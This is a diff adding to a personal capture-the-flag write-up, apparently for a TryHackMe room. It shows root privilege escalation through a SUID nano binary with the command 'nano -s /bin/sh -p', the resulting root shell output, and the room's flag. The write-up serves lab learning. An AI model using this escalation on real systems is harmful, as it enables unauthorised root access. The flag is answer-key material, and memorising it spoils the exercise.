@@ -605,4 +605,26 @@ zeamkish@ip-10-112-161-224:~$ ls -la /usr/bin/nano
 ![](Obsidian%20assets/Exposegtfobins.png)
 
 > [!note]
-> Used second 
+> Used second instructions to get me the root shell and finding root flag was easy.
+
+```
+zeamkish@ip-10-112-161-224:~$ nano -s '/bin/sh -p'
+# whoami
+root
+# ls
+flag.txt  ssh_creds.txt
+# cd /
+# ls
+'"'    boot   etc    lib     lib64    lost+found   mnt   proc   run    snap   sys   usr
+ bin   dev    home   lib32   libx32   media        opt   root   sbin   srv    tmp   var
+# cd root
+# ls
+flag.txt  snap
+# cat flag.txt
+THM{ROOT_EXPOSED_1001}
+```
+
+![](Obsidian%20assets/Exposecompleted.png)
+
+
+
